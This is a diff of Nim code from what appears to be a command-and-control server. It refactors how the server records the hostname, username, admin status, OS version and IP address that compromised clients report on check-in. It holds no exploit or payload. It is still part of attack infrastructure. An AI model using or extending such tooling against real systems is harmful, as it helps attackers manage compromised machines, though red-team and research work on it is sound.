@@ -25,27 +25,28 @@ proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: C2Client) {
       else: 
         case response["task"].getStr():
           of "identify":
-            server.clients[client.id].loaded = true
-            server.clients[client.id].hostname = response["data"]["hostname"].getStr("")
-            server.clients[client.id].username = response["data"]["username"].getStr("")
-            server.clients[client.id].isAdmin = response["data"]["isAdmin"].getBool(false)
+            client.loaded = true
+            client.ipAddress = tcpSocket.netAddr
+            client.hostname = response["data"]["hostname"].getStr("")
+            client.username = response["data"]["username"].getStr("")
+            client.isAdmin = response["data"]["isAdmin"].getBool(false)
             case response["data"]["osType"].getStr("unknown"):
             of "unknown":
-                server.clients[client.id].osType = UnknownOS
+                client.osType = UnknownOS
             of "windows":
-                server.clients[client.id].osType = WindowsOS
+                client.osType = WindowsOS
             of "linux":
-                server.clients[client.id].osType = LinuxOS
-            server.clients[client.id].windowsVersionInfo = WindowsVersionInfo(
+                client.osType = LinuxOS
+            client.windowsVersionInfo = WindowsVersionInfo(
                 majorVersion: response["data"]["windowsOsVersionInfo"]["majorVersion"].getInt(),
                 minorVersion: response["data"]["windowsOsVersionInfo"]["minorVersion"].getInt(),
                 buildNumber: response["data"]["windowsOsVersionInfo"]["buildNumber"].getInt()
             )
-            server.clients[client.id].linuxVersionInfo = LinuxVersionInfo(
+            client.linuxVersionInfo = LinuxVersionInfo(
                 kernelVersion: response["data"]["linuxOsVersionInfo"]["kernelVersion"].getStr(),
             )
-            server.clients[client.id].isAdmin = response["data"]["isAdmin"].getBool()
-            server.clients[client.id].isAdmin = response["data"]["isAdmin"].getBool()
+            client.isAdmin = response["data"]["isAdmin"].getBool()
+            client.isAdmin = response["data"]["isAdmin"].getBool()
           of "output":
             let output = response["data"]["output"].getStr()
             let category = response["data"]["category"].getStr()
